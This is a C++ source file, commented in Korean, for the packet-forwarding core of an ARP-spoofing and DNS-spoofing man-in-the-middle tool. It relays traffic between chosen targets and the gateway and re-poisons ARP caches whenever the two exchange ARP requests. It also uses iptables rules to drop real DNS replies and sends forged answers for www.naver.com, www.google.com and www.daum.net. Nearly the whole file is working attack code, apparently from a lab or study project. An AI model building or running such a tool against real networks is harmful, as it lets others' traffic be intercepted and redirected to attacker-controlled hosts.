#include "packet_forwarder.hpp"
#include "dns_spoof.hpp"
#include <iostream>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <string.h>
#include <chrono>
#include <algorithm>
#include <unordered_set>
#include <unordered_map>
#include <cstdlib>
#include <sstream>

using namespace std;
using namespace std::chrono;

#define DNS_PORT 53

// 스푸핑 대상 도메인 목록
const vector<string> SPOOF_DOMAINS = 
{
    "www.naver.com", 
    "www.google.com", 
    "www.daum.net"
};

PacketForwarder::PacketForwarder(pcap_t* handle, ArpSpoofer* spoofer)
    : handle(handle), spoofer(spoofer), running(false) 
{
    // 초기화 코드
}

PacketForwarder::~PacketForwarder() 
{
    stop();
}

// iptables 규칙 추가: DNS 통신 차단 (PCAP을 이용한 PACKET DROP 실패로 긴급 구현)
// 이후 raw Socket 구현으로 내용 변경 필요
bool add_iptables_rules(const string& target_ip) 
{
    // 기존 규칙 제거
    system("iptables -F FORWARD");
    
    // 네트워크 인터페이스 간 포워딩 활성화
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    
    // 대상 IP에서 게이트웨이로의 DNS 트래픽 차단 (요청)
    // string cmd1 = "iptables -A FORWARD -p udp -s " + target_ip + " --dport 53 -j DROP";
    // int ret1 = system(cmd1.c_str());
    
    // 게이트웨이에서 대상 IP로의 DNS 트래픽 차단 (응답)
    string cmd2 = "iptables -A FORWARD -p udp -d " + target_ip + " --sport 53 -j DROP";
    int ret2 = system(cmd2.c_str());
    
    // 그 외 모든 트래픽 허용
    system("iptables -A FORWARD -j ACCEPT");
    
    // return (ret1 == 0 && ret2 == 0);
    return ( ret2 == 0);
}

// iptables 규칙 제거
void remove_iptables_rules() 
{
    system("iptables -F FORWARD");
    system("iptables -P FORWARD ACCEPT");
}

void PacketForwarder::start() 
{
    if (running) 
    {
        return;
    }
    
    running = true;
    
    // 대상 IP 목록 추출
    vector<string> target_ips;
    for (const auto& target : spoofer->get_targets()) 
    {
        target_ips.push_back(target->get_ip_str());
        
        // iptables 규칙 추가
        if (add_iptables_rules(target->get_ip_str())) 
        {
            cout << "DNS 차단 규칙 적용됨 - 대상: " << target->get_ip_str() << "\n";
        } 
        else 
        {
            cerr << "DNS 차단 규칙 적용 실패 - 대상: " << target->get_ip_str() << "\n";
        }
    }
    
    // 패킷 처리 스레드 시작
    forward_thread = make_unique<thread>(&PacketForwarder::forward_loop, this);
    
    cout << "패킷 포워딩 시스템 시작됨" << endl;
}

void PacketForwarder::stop() 
{
    if (!running) 
    {
        return;
    }
    
    running = false;
    cv.notify_all();
    
    if (forward_thread && forward_thread->joinable()) 
    {
        forward_thread->join();
    }
    
    // iptables 규칙 제거
    remove_iptables_rules();
    cout << "iptables 규칙 제거됨" << endl;

    // DNS 복구 실행
    recover_dns();
    
    cout << "패킷 포워딩 시스템 종료됨" << endl;
}

void PacketForwarder::forward_loop() 
{
    struct pcap_pkthdr* header;
    const u_int8_t* packet;
    int res;
    
    auto last_stat_time = high_resolution_clock::now();
    
    while (running) {
        res = pcap_next_ex(handle, &header, &packet);
        
        if (res == 0) {
            // 타임아웃 - 새 패킷 없음
            this_thread::sleep_for(chrono::microseconds(10));
            
            // 5초마다 통계 출력
            auto now = high_resolution_clock::now();
            if (duration_cast<seconds>(now - last_stat_time).count() >= 5) 
            {
                last_stat_time = now;
            }
            continue;
        } 
        else if (res < 0) 
        {
            cerr << "패킷 캡처 오류: " << pcap_geterr(handle) << endl;
            break;
        }
        
        // 이더넷 헤더 추출
        struct ether_header* eth = (struct ether_header*)packet;
        
        // 제작한 패킷일 경우, SKIP
        if (mac_equals(eth->ether_shost, spoofer->get_attacker_mac())) 
        {
            continue;
        }
        
        if (ntohs(eth->ether_type) == ETHERTYPE_ARP) 
        {
            // ARP 패킷 처리
            handle_arp_packet(packet, header->len);
        }
        else if (ntohs(eth->ether_type) == ETHERTYPE_IP) 
        {
            // IP 헤더 추출
            struct ip_header* ip = (struct ip_header*)(packet + sizeof(struct ether_header));
            
            if (ip->ip_p == IPPROTO_UDP) 
            {
                int ip_header_len = (ip->ip_vhl & 0x0f) * 4;
                struct udp_header* udp = (struct udp_header*)(packet + sizeof(struct ether_header) + ip_header_len);
                
                uint16_t src_port = ntohs(udp->uh_sport);
                uint16_t dst_port = ntohs(udp->uh_dport);
                
                if (src_port == DNS_PORT || dst_port == DNS_PORT) 
                {
                    // DNS 패킷 처리
                    if (handle_dns_packet(packet, header->len)) 
                    {
                       continue;    // DNS 패킷이 처리되었으면 다음 패킷으로
                    }
                }
            }
            
            // 스푸핑 대상 패킷인지 확인
            if (is_spoofed_packet(packet, header->len)) 
            {
                forward_packet(packet, header->len);    // 일반 IP 패킷 포워딩
            }
        }
    }
}

bool PacketForwarder::handle_dns_packet(const u_int8_t* packet, size_t packet_len) 
{   
    // 이더넷 및 IP 헤더
    struct ether_header* eth = (struct ether_header*)packet;
    struct ip_header* ip = (struct ip_header*)(packet + sizeof(struct ether_header));
    int ip_header_len = (ip->ip_vhl & 0x0f) * 4;
    
    // UDP 헤더
    struct udp_header* udp = (struct udp_header*)(packet + sizeof(struct ether_header) + ip_header_len);
    uint16_t src_port = ntohs(udp->uh_sport);
    uint16_t dst_port = ntohs(udp->uh_dport);
    
    // DNS 헤더
    dns_header* dns = (dns_header*)(packet + sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
    uint16_t dns_id = ntohs(dns->id);
    
    // 출발지/목적지 IP
    u_int8_t src_ip[4], dst_ip[4];
    memcpy(src_ip, &ip->ip_src, 4);
    memcpy(dst_ip, &ip->ip_dst, 4);
    
    uint32_t src_ip_val = ntohl(ip->ip_src);
    uint32_t dst_ip_val = ntohl(ip->ip_dst);
    
    // DNS 요청 패킷 (클라이언트 -> 서버)
    if (dst_port == DNS_PORT) 
    {
        // DNS 데이터 및 길이
        uint8_t* dns_data = (uint8_t*)(packet + sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
        size_t dns_data_len = packet_len - (sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
        
        // 도메인 이름 추출
        string domain = extract_domain_name(dns_data, dns_data_len);
        
        if (domain.empty()) 
        {
            return false; // 도메인 없으면 정상 처리
        }
        
        // 스푸핑 대상 도메인인지 확인
        bool is_target_domain = false;
        for (const auto& spoof_domain : SPOOF_DOMAINS) 
        {
            if (domain.find(spoof_domain) != string::npos) 
            {
                is_target_domain = true;
                break;
            }
        }

        cout << " DNS 요청 감지 " << domain << ", ID: 0x" << hex << endl;
        
        if (is_target_domain) 
        {
            // 패킷 복사
            u_int8_t* packet_copy = new u_int8_t[packet_len];
            memcpy(packet_copy, packet, packet_len);
            
            // DNS 스푸핑 응답 전송을 별도의 스레드로 실행하여 메인 루프 블록 방지
            std::thread([this, packet_copy, packet_len, domain]() {
                send_dns_spoof_response(
                    handle,
                    packet_copy,
                    packet_len,
                    spoofer->get_attacker_mac(),
                    spoofer->get_gateway_ip(),
                    domain,
                    spoofer->get_targets()
                );
                delete[] packet_copy;
            }).detach();
            
            cout << "DNS 요청 차단: " << domain << "\n";
            
            return true; // 패킷 드롭됨
        }

    }
    
    return false; // 패킷이 처리되지 않음
}

void PacketForwarder::handle_arp_packet(const u_int8_t* packet, size_t packet_len) 
{
      
    struct ether_header* eth = (struct ether_header*)packet;
    struct arp_header* arp = (struct arp_header*)(packet + sizeof(struct ether_header));
    
    // ARP 요청인지 확인
    if (ntohs(arp->oper) != 1) 
    {
        // ARP 응답은 그냥 포워딩
        forward_packet(packet, packet_len);
        return;
    }
    
    const u_int8_t* sender_ip = arp->spa;
    const u_int8_t* target_ip = arp->tpa;
    
    // 게이트웨이와 관련된 ARP 요청인지 확인
    bool involves_gateway = ip_equals(sender_ip, spoofer->get_gateway_ip()) || 
                          ip_equals(target_ip, spoofer->get_gateway_ip());
    
    // 스푸핑 대상과 관련된 ARP 요청인지 확인
    bool involves_target = false;
    const SpoofTarget* related_target = nullptr;
    
    for (const auto& target : spoofer->get_targets()) 
    {
        if (ip_equals(sender_ip, target->get_ip()) || ip_equals(target_ip, target->get_ip())) 
        {
            involves_target = true;
            related_target = target.get();
            break;
        }
    }
    
    // 게이트웨이와 대상 간의 ARP 요청 처리
    if (involves_gateway && involves_target) 
    {
        cout << "게이트웨이 <-> 대상 ARP 요청 감지. 차단 및 스푸핑 재수행\n";

        if (related_target != nullptr) 
        {
            // 특정 대상에 대한 스푸핑 재수행
            spoofer->send_arp_spoofing_packet(related_target);
        } 
        else 
        {
            // 모든 대상에 대해 스푸핑 재수행
            for (const auto& target : spoofer->get_targets()) 
            {
                spoofer->send_arp_spoofing_packet(target.get());
            }
        }
        
        return; // 원래 ARP 요청은 포워딩하지 않음
    }
    
    // 그 외의 경우 정상 포워딩
    forward_packet(packet, packet_len);
}

bool PacketForwarder::is_spoofed_packet(const u_int8_t* packet, size_t packet_len) 
{
    if (packet_len < sizeof(struct ether_header) + sizeof(struct ip_header)) 
    {
        return false;
    }
    
    struct ether_header* eth = (struct ether_header*)packet;
    if (ntohs(eth->ether_type) != ETHERTYPE_IP) 
    {
        return false;
    }
    
    // 본인 패킷은 절대 처리하지 않음
    if (mac_equals(eth->ether_shost, spoofer->get_attacker_mac())) 
    {
        return false;
    }
    
    struct ip_header* ip = (struct ip_header*)(packet + sizeof(struct ether_header));
    u_int8_t src_ip[4], dst_ip[4];
    memcpy(src_ip, &ip->ip_src, 4);
    memcpy(dst_ip, &ip->ip_dst, 4);
    
    // 게이트웨이 관련 패킷인지 확인
    bool src_is_gateway = ip_equals(src_ip, spoofer->get_gateway_ip());
    bool dst_is_gateway = ip_equals(dst_ip, spoofer->get_gateway_ip());
    
    // 공격 대상 관련 패킷인지 확인
    bool src_is_target = false;
    bool dst_is_target = false;
    
    for (const auto& target : spoofer->get_targets()) 
    {
        if (ip_equals(src_ip, target->get_ip())) 
        {
            src_is_target = true;
        }
        if (ip_equals(dst_ip, target->get_ip())) 
        {
            dst_is_target = true;
        }
    }
    
    // 게이트웨이와 대상 간의 통신 패킷인지 확인
    return (src_is_target && dst_is_gateway) || (src_is_gateway && dst_is_target);
}

void PacketForwarder::forward_packet(const u_int8_t* packet, size_t packet_len) 
{  
    // 패킷 복사
    u_int8_t* new_packet = new u_int8_t[packet_len];
    memcpy(new_packet, packet, packet_len);
    
    // 이더넷 및 IP 헤더
    struct ether_header* eth = (struct ether_header*)new_packet;
    struct ip_header* ip = (struct ip_header*)(new_packet + sizeof(struct ether_header));
    
    // IP 주소 추출
    u_int8_t src_ip[4], dst_ip[4];
    memcpy(src_ip, &ip->ip_src, 4);
    memcpy(dst_ip, &ip->ip_dst, 4);
    
    // 패킷 방향에 따라 MAC 주소 설정
    if (ip_equals(src_ip, spoofer->get_gateway_ip())) 
    {
        // 게이트웨이 -> 대상
        memcpy(eth->ether_shost, spoofer->get_attacker_mac(), 6);
        
        bool found_target = false;
        for (const auto& target : spoofer->get_targets()) 
        {
            if (ip_equals(dst_ip, target->get_ip())) 
            {
                memcpy(eth->ether_dhost, target->get_mac(), 6);
                found_target = true;
                break;
            }
        }
        
        if (!found_target) 
        {
            delete[] new_packet;
            return;
        }
    } 
    else 
    {
        // 대상 -> 게이트웨이
        memcpy(eth->ether_shost, spoofer->get_attacker_mac(), 6);
        memcpy(eth->ether_dhost, spoofer->get_gateway_mac(), 6);
    }
    
    // MAC 주소 유효성 확인
    if (mac_equals(eth->ether_dhost, ZERO_MAC)) 
    {
        cout << "목적지 MAC 주소가 설정되지 않음. 포워딩 취소\n";
        delete[] new_packet;
        return;
    }
    
    // 패킷 전송
    if (pcap_sendpacket(handle, new_packet, packet_len) != 0) 
    {
        cerr << "패킷 포워딩 실패: " << pcap_geterr(handle) << "\n";
    }
    
    // 메모리 해제
    delete[] new_packet;
}

void PacketForwarder::recover_dns()
{
    cout << "DNS 스푸핑 복구 시작..." << endl;
    
    // 복구용 DNS 응답 패킷 전송
    send_dns_recovery_responses(
        handle,
        spoofer->get_attacker_mac(),
        spoofer->get_gateway_ip(),
        spoofer->get_targets()
    );
    
    cout << "DNS 스푸핑 복구 완료" << endl;
}